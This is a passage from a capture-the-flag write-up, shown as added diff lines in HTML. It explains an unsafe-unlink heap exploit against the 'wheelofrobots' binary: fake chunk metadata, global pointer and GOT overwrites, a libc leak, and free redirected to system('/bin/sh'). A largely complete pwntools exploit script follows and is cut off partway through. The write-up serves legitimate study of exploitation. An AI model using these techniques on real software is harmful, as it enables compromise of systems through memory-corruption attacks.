+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">fake_chunk_footer</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_chunk_footer</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000450</span><span class="p">)</span>	<span class="c1"># prev_size</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_chunk_footer</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000460</span><span class="p">)</span>	<span class="c1"># prev_in_use flag off</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">change_name</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">fake_chunk_footer</span><span class="p">)</span>
+</span></span></code></pre></div><p>The fake chunk now looks like this in the heap. The blue is the devil bot and the yellow is the destructor bot.</p>
+<img src="./Images/pwndbg_heap.jpeg" alt="start of chunk" style="display:block; margin:auto;">
+<br />
+<img src="./Images/pwndbg_heap2.jpeg" alt="end of chunk" style="display:block; margin:auto;">
+<p>The last step to do is remove the destructor bot to cause the heap allocator to unlink the chunks:</p>
+<p><code>remove_bot('6')</code></p>
+<p>And now when I check the address of devil bot’s calloc pointer in memory, it says that its at the address 0x006030e8 which is the same as 0x00603100 - 0x18 which is the same as the address of destructors global calloc pointer. So the next time we write to the devil bot, we will be overwriting the global variables.</p>
+<img src="./Images/pwndbg_p.jpeg" alt="address 0x603100 has value of 0x6030e8" style="display:block; margin:auto;">
+
+<h3 class="relative group">Popping a shell 
+    <div id="popping-a-shell" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#popping-a-shell" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Since there is partial RELRO, the first thing I thought of was overwriting a GOT address to system and call that function with a pointer to “/bin/sh” to pop a shell. This requires a libc leak to know where the functions in libc are because of ASLR.</p>
+<p>The function that spins the wheel has a chance of printing the data at a calloc pointer, so if I make one or more of the global calloc pointers point to a GOT address, I will get a libc leak. Since the total number of bots added is less than 3, more need to be added before I can spin the wheel. Then I write to devil bot which will overwrite the destructor, bender, tim, devil, and billionaire bot calloc pointers to be 0x603018, 0x6030f0, 0x603098, 0x603018, and 0x603018 respectively.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">h</span><span class="err">​​</span><span class="n">eap_leak_payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x603018</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6030f0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x603098</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x603018</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">change_name</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="n">heap_leak_payload</span><span class="p">)</span>
+</span></span></code></pre></div><p>The address of free is at 0x603018 so I need to wheel to print any one of those 3 bots to get the leak.</p>
+<p>The address of exit is at 0x603098 so I set tims pointer to the GOT address of exit so I can overwrite it with the address of the change_name function (0x4013e0) so that the function doesn’t terminate once it prints the leak.</p>
+<p>The address of benders global pointer is 0x6030f0 so I have benders pointer point to itself for a later part in the exploit.</p>
+<p><code>change_name('1', p64(0x4013e0))</code></p>
+<p>There is a problem I ran into though. No matter what, the address of free was never printed in a reasonable amount of time (since the wheel is random). The reason is because the address of free starts with a NULL byte so printf stops there and doesnt print the rest. So I need to change the LSB of the free address to something other than a NULL byte so that it gets printed. So I change the name of devil bot which points to free and write 0x01.</p>
+<p><code>change_name('3', b'\x01')</code></p>
+<p>And now I just need to keep running the program until I get lucky and it prints the address of free.</p>
+<img src="./Images/fry_ascii.jpeg" alt="fry ascii art printing pointer leak" style="display:block; margin:auto;">
+<p>After this, the program will then call the change_name function since I overwrote the exit function in the GOT. So then I choose to change the name of destructor bot which points to free in the GOT and overwrite it with the address of system.</p>
+<p>From here all that&rsquo;s left is to do is choose who I want to free so I chose bender. I had set benders calloc pointer to point to itself earlier for this reason, so I can edit it now. So I change bender&rsquo;s pointer to be the address of the string “/bin/sh” in libc and then remove bender which calls free with the pointer of the string “/bin/sh” and a shell is popped.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">change_name</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><p>Since the wheel is random, I wrapped this logic in a while loop and kept running the program until I got the leak and popped a shell.</p>
+<img src="./Images/shell_popped.jpg" alt="popping a shell with whoami output" style="display:block; margin:auto;">
+
+<h3 class="relative group">Full Exploit Code 
+    <div id="full-exploit-code" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#full-exploit-code" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">add_bot</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">optional</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice :&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">index</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice :&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">index</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">index</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span> <span class="ow">or</span> <span class="n">index</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;6&#39;</span><span class="p">)):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">optional</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;: &#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">optional</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remove_bot</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice :&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">index</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice :&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">change_name</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice :&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice :&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">index</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">index</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;name:&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">elif</span> <span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">bytes</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fill_tcache</span><span class="p">(</span><span class="n">size</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;tmux&#39;</span><span class="p">,</span> <span class="s1">&#39;splitw&#39;</span><span class="p">,</span> <span class="s1">&#39;-fh&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="mh">0x4017f2</span>
+</span></span><span class="line"><span class="cl"><span class="n">before_input</span> <span class="o">=</span> <span class="mh">0x40185a</span>
+</span></span><span class="line"><span class="cl"><span class="n">exit_in_wheel</span> <span class="o">=</span> <span class="mh">0x401725</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;b *</span><span class="si">{</span><span class="n">main</span><span class="si">}</span><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">b *</span><span class="si">{</span><span class="n">before_input</span><span class="si">}</span><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">b *</span><span class="si">{</span><span class="n">exit_in_wheel</span><span class="si">}</span><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">gdbscript</span> <span class="o">+=</span> <span class="s1">&#39;c</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">17</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./wheelofrobots&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="mh">0x400000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="kc">True</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s1">&#39;./wheelofrobots&#39;</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">		<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./wheelofrobots&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">fill_tcache</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">fake_chunk_metadata</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span>		<span class="c1"># filler</span>
+</span></span><span class="line"><span class="cl">	<span class="n">fake_chunk_metadata</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000451</span><span class="p">)</span>		<span class="c1"># fake_chunk size</span>
+</span></span><span class="line"><span class="cl">	<span class="n">fake_chunk_metadata</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00603100</span> <span class="o">-</span> <span class="mh">0x18</span><span class="p">)</span>	<span class="c1"># P-&gt;fd-&gt;bk = P</span>
+</span></span><span class="line"><span class="cl">	<span class="n">fake_chunk_metadata</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00603100</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>	<span class="c1"># P-&gt;bk-&gt;fd = P</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">fake_chunk_footer</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
+</span></span><span class="line"><span class="cl">	<span class="n">fake_chunk_footer</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000450</span><span class="p">)</span>	<span class="c1"># prev_size</span>
+</span></span><span class="line"><span class="cl">	<span class="n">fake_chunk_footer</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000460</span><span class="p">)</span>	<span class="c1"># prev_in_use flag off</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">heap_leak_payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x603018</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x6030f0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x603098</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x603018</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>	<span class="c1"># set tim malloc ptr to exit GOT addr and the other bot ptrs to puts GOT addr</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">#		                ^ destructor	^ bender	    ^ tim		    ^ devil - billionaire</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;6&#39;</span><span class="p">,</span> <span class="s1">&#39;53&#39;</span><span class="p">)</span>			<span class="c1"># malloc &gt; fastbin size to move the pointer for bender ptr deeper in heap to overwrite chunk metadata</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">)</span>			<span class="c1"># add bender bot for 0x60 chunk</span>
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;6&#39;</span><span class="p">)</span>				<span class="c1"># remove destructor chunk, gets put into unsorted bin</span>
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>				<span class="c1"># remove bender chunk, gets put in fastbin</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;4</span><span class="se">\x00\x00\x00\x01</span><span class="s1">&#39;</span><span class="p">)</span>		<span class="c1"># add chainsmoker bot to consolidate fastbin chunk and unsorted bin chunk into one bigger allocated chunk</span>
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>				<span class="c1"># remove this new 0xfa0 size chunk, consolidates because &gt; its next to top chunk and size &gt; tcache max size</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="s1">&#39;55&#39;</span><span class="p">)</span>			<span class="c1"># malloc more than the first malloc call so that bender ptr is near end of chunk to overwrite next chunk metadata</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;6&#39;</span><span class="p">,</span> <span class="s1">&#39;55&#39;</span><span class="p">)</span>			<span class="c1"># add another chunke &gt; tcache max size, metadata will be overwritten</span>
+</span></span><span class="line"><span class="cl">	<span class="n">change_name</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="n">fake_chunk_footer</span><span class="p">)</span>	<span class="c1"># set prev_size and prev_in_use flag to off</span>
+</span></span><span class="line"><span class="cl">	<span class="n">change_name</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="n">fake_chunk_metadata</span><span class="p">)</span>	<span class="c1"># set fake chunk metadata, will get new chunk at global pointer</span>
+</span></span><span class="line"><span class="cl">	<span class="n">remove_bot</span><span class="p">(</span><span class="s1">&#39;6&#39;</span><span class="p">)</span>				<span class="c1"># cause unsafe unlink</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>				<span class="c1"># so we can spin wheel</span>
+</span></span><span class="line"><span class="cl">	<span class="n">add_bot</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>				<span class="c1"># add tim, which sets tims malloc ptr</span>
+</span></span><span class="line"><span class="cl">	<span class="n">change_name</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="n">heap_leak_payload</span><span class="p">)</span>	<span class="c1"># use new chunk at destructor ptr - 0x18 to overwrite tim ptr to start of GOT</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">change_name</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4013e0</span><span class="p">))</span>		<span class="c1"># set free to dummy value to overwrite again later and set _exit to instruction in main to restart main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">change_name</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x01</span><span class="s1">&#39;</span><span class="p">)</span>		<span class="c1"># change LSB null byte of GOT free addr so that program prints entire addr</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice :&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>				<span class="c1"># spin wheel to try and print value of free address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">free_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)[</span><span class="o">-</span><span class="mi">8</span><span class="p">:</span><span class="o">-</span><span class="mi">2</span><span class="p">],</span> <span class="n">byteorder</span><span class="o">=</span><span class="s1">&#39;little&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="n">free_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xfffff</span> <span class="o">!=</span> <span class="mh">0x00000</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">		<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Garbage libc base address&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">		<span class="k">continue</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">free_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">	<span class="n">system</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;libc base addr @&#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="s1">&#39;system addr    @&#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;choice :&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>					<span class="c1"># exit now calls change name, so overwrite GOT free with system</span>
+</span></span><span class="line"><span class="cl">	<span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;name:&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
